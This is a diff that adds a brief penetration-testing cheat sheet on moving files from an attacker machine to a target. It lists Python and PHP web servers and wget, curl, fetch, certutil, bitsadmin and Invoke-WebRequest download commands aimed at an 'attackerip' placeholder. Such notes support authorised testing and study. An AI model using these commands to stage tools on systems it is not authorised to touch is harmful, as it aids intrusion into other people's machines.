@@ -1,0 +1,23 @@
+#FileTransfer Linux
+
+Python SimpleHTTPServer
+*on Attacker
+python -m SimpleHTTPServer
+
+*on target
+wget <attackerip>:8000/filename
+
+*with php
+php -S <ip>:<port>
+php -S 192.168.1.1:80 
+
+*on target
+wget http://attackerip/file
+curl http://attackerip/file > file
+fetch http://attackerip/file 
+axel http://website.com/file
+-------------------------------------
+#FileTransfer Windows
+certutil.exe --urlcache -split -f "<url>"
+bitsadmin.exe /transfer n "<url>" "dosyanın koyulacağı yer"
+Invoke-WebRequest https://path/to/file.txt -OutFile C:\file.txt
